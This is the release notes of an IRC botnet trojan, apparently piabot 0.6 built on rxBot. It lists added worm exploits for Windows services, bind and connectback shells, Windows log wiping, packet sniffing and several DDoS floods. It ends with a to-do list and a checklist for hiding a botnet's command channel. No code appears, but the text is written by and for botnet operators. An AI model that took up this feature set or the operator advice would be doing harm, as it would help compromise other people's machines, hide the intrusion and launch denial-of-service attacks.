                     __              __           __        ____
        __          /\ \            /\ \__      /'__`\     /'___\
 _____ /\_\     __  \ \ \____    ___\ \ ,_\    /\ \/\ \   /\ \__/
/\ '__`\/\ \  /'__`\ \ \ '__`\  / __`\ \ \/    \ \ \ \ \  \ \  _``\
\ \ \L\ \ \ \/\ \L\.\_\ \ \L\ \/\ \L\ \ \ \_    \ \ \_\ \__\ \ \L\ \
 \ \ ,__/\ \_\ \__/.\_\\ \_,__/\ \____/\ \__\    \ \____/\_\\ \____/
  \ \ \/  \/_/\/__/\/_/ \/___/  \/___/  \/__/     \/___/\/_/ \/___/
   \ \_\   i.love.nameless :)                              koncool
    \/_/

Base:
 - rxBot 0.6.5

Changes:
 - added colours (just when you thought linkbot is the only cool bot)
 - removed useless scanners
 - added ftp daemon
 - added lsass, asn.1-smb(nt)/http, workstation service exploits
 - added cisco scanners over telnet and http
 - added windows event/security/application log killer
 - added irc flooder
 - added reconnect.in function (input must be in seconds, rinms for millisecs)
 - added connectback server and reverse lsass exploit
 - added bind shell function
 - added manual exploiting function
 - added imail, iis5ssl, umpnp, veritas backup exec exploits
 - added ftp/tftp/connectback statistics
 - added phatbots lsass exploit over ports 135 and 1025
 - added win2000/iis5.0 webdav ntdll.dll exploit
 - added port scanner
 - added portbind shellcode to dcom, wkssvc, plsass - they now use ftpd
 - added netsend command for message flooding over messenger service
 - added autoscan on startup
 - added messenger service exploit by adik
 - added phatbots targa3 and wonk ddos attacks
 - added diablos skysyn attack
 - added spoofed udp attack from wisdom
 - added hod's message queuing service exploit
 - added phatbot packet sniffer
 - added kaiten's tsunami ddos (push+ack flood)
 - added scanall from urxbot
 - fixed wonk to use wisdom source ip spoofing

Todo:
 - find out why tsunami doesnt stop
 - add more cdkeys and netbios shares
 - test speedtest and use reptiles if it crashes
 - split explist output to two or more lines of 10 exploits each
 - test webdav, plsass, messenger service, wkssvc, dcom, imail, msmq
 - add appropriate bot file server check for each manual exploitation
 - add customizable irc commands
 - add dynamic login system based on hostname nickname and ident
 - fix irc flooder (wont connect on some servers)
 - add nickname juper with ISON every 700ms
 - fix memory leaks

Securing your botnet checklist:
 - ircd with onjoin +um-o
 - channel +keyed or +i and have bots request invite
 - dynamic login generator
 - remove, login, update, download commands changed
